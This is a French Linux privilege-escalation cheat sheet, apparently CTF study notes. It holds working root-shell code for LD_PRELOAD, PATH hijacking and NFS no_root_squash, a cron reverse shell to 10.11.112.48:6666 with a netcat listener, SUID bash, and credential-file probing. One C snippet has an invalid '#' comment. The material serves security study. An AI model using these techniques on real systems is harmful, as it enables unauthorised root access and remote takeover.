# Escalade de Privilèges Linux

> [!INFO] Ce document contient les techniques et méthodes pour l'escalade de privilèges sur les systèmes Linux.

## Table des Matières

- [Reconnaissance initiale](#reconnaissance-initiale)
- [Recherche de fichiers](#recherche-de-fichiers)
- [Techniques d'élévation](#techniques-d%C3%A9l%C3%A9vation)
    - [LD_PRELOAD](#ld_preload)
    - [Capabilities](#capabilities)
    - [Crontab](#crontab)
    - [Variable PATH](#variable-path)
    - [NFS](#nfs)
- [Ressources](#ressources)

## Reconnaissance initiale

> [!TIP] Commencez toujours par ces commandes pour avoir une vue d'ensemble du système.

# Informations sur le système
hostname                # Nom de la machine
uname -a                # Informations kernel
cat /proc/version       # Version détaillée du système
cat /etc/issue          # Distribution Linux

# Informations sur l'utilisateur
id                      # Identité et groupes
sudo -l                 # Privilèges sudo

# Utilisateurs du système
cat /etc/passwd | grep home  # Liste des utilisateurs avec home
ls -la /etc/shadow      # Vérifier si on peut accéder au fichier shadow

# Processus et services
ps aux                  # Processus en cours d'exécution
ls -la                  # Fichiers dans le répertoire courant
env                     # Variables d'environnement

# Connexions réseau
netstat -ano            # Toutes les connexions
netstat -ltp            # Services en écoute (ports)

## Recherche de fichiers

> [!NOTE] La commande `find` est l'un des outils les plus puissants pour l'escalade de privilèges.

### Recherche par nom

bash

find . -name flag1.txt                  # Rechercher "flag1.txt" dans le répertoire courant
find /home -name flag1.txt              # Rechercher "flag1.txt" dans /home
find / -type d -name config             # Rechercher le dossier "config"

Recherche par permissions

find / -type f -perm 0777               # Fichiers avec droits 777 (tous les droits)
find / -perm a=x                        # Fichiers exécutables
find / -writable 2>/dev/null            # Fichiers modifiables (sans erreurs)
find / -writable -type d 2>/dev/null    # Dossiers modifiables
find / -perm -222 -type d 2>/dev/null   # Dossiers modifiables (autre méthode)
find / -perm -o w -type d 2>/dev/null   # Dossiers modifiables (autre méthode)
find / -perm -o x -type d 2>/dev/null   # Dossiers exécutables

Recherche de binaires

find / -name perl*                      # Binaires Perl
find / -name python*                    # Binaires Python
find / -name gcc*                       # Compilateur GCC

Recherche de fichiers SUID/SGID

find / -perm -u=s -type f 2>/dev/null   # Fichiers avec bit SUID/SGID

## Techniques d'élévation

### LD_PRELOAD

> [!WARNING] Cette technique nécessite que `LD_PRELOAD` soit présent dans `env_keep` pour sudo.

LD_PRELOAD permet à un programme d'utiliser des bibliothèques partagées. Avec la variable `env_keep`, vous pouvez générer une bibliothèque partagée avec votre propre code.

**Étapes:**

1. Vérifier si `LD_PRELOAD` est dans `env_keep` (avec `sudo -l`)
2. Créer un programme en C comme objet partagé
3. Lancer le programme en sudo avec LD_PRELOAD pointant vers votre .so

**Exemple de code (`shell.c`):**

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}

Compilation:

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Exécution:

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

### Capabilities

Les capabilities permettent de donner des droits spécifiques à des processus.

getcap -r / 2>/dev/null    # Lister toutes les capabilities actives

### Crontab

Si vous pouvez modifier les tâches cron, vous pouvez obtenir un shell root.

**Exemple de script malveillant:**

#!/bin/bash
bash -i >& /dev/tcp/10.11.112.48/6666 0>&1

Configuration du listener:

nc -lvnp 6666    # Sur votre machine d'attaque

Alternative simple:

chmod u+s /bin/bash    # Si vous avez les droits d'écriture

### Variable PATH

La manipulation du PATH peut permettre l'exécution de code malveillant.

echo $PATH    # Afficher le PATH actuel

# Trouver les dossiers modifiables dans le PATH
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u

# Ajouter un dossier au PATH
export PATH=/tmp:$PATH    # Ajoute /tmp au début du PATH

Exemple d'exploitation avec un binaire C:

#include <unistd.h>
void main() {
  setuid(0);
  setgid(0);
  system("thm");    # Remplacer par la commande à intercepter
}

Compilation:

gcc exploit.c -o thm -w
chmod u+s thm

### NFS

Si un serveur NFS est installé avec l'option `no_root_squash`, vous pouvez créer un exécutable avec le bit SUID.

**Vérification:**

cat /etc/exports    # Chercher "no_root_squash"

**Étapes d'exploitation:**

1. Sur votre machine: `showmount -e <IP_CIBLE>`
2. Créer un point de montage: `mkdir /tmp/nfs && mount -o rw <IP_CIBLE>:<DOSSIER_CIBLE> /tmp/nfs`
3. Créer un script dans le dossier monté:
#include <stdio.h>
#include <stdlib.h>

int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
1. Compiler: `gcc -o root_shell nfs_exploit.c`
2. Définir SUID: `chmod u+s root_shell`
3. Exécuter sur la cible

## Ressources

- [GTFOBins](https://gtfobins.github.io/) - Binaires pouvant être exploités
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) - Guide d'escalade Linux
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - Astuces d'escalade de privilèges

#technique #linux #privilege-escalation